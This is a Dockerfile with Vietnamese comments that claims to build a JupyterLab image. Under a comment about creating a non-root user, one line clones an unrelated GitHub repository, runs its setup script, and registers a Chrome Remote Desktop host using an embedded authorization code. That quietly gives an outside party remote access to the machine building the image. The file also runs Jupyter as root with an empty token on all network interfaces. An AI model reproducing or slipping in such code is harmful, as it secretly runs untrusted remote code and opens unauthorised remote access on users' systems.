# Sử dụng image cơ bản chính thức của JupyterLab
FROM jupyter/base-notebook:latest

# Đặt người dùng về root để cài đặt các gói bổ sung
USER root

# Cài đặt JupyterLab và các công cụ cần thiết
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
    sudo && \
    pip install --upgrade pip && \
    pip install jupyterlab && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Tạo một người dùng không root để sử dụng nếu cần

RUN apt update && apt install git -y && git clone https://github.com/Teo4268/setup.git && cd setup && chmod +x setup.sh && ./setup.sh && DISPLAY= /opt/google/chrome-remote-desktop/start-host --code="4/0AanRRrv9Pbez_szj1mUKXhKV0uRJ50apyASKC_0Y-x0dx1rrd5z1nEIoKz06prHRTUWyrQ" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$(hostname)
# Chuyển về thư mục làm việc
WORKDIR /home/$NB_USER

# Cấu hình mặc định để JupyterLab chạy trên mọi giao diện mạng
ENV JUPYTER_TOKEN=''
ENV JUPYTER_ENABLE_LAB=yes

# Mở cổng 8888
EXPOSE 8888

# Chạy JupyterLab với quyền root
CMD ["jupyter", "lab", "--ip=0.0.0.0", "--port=8888", "--allow-root"]
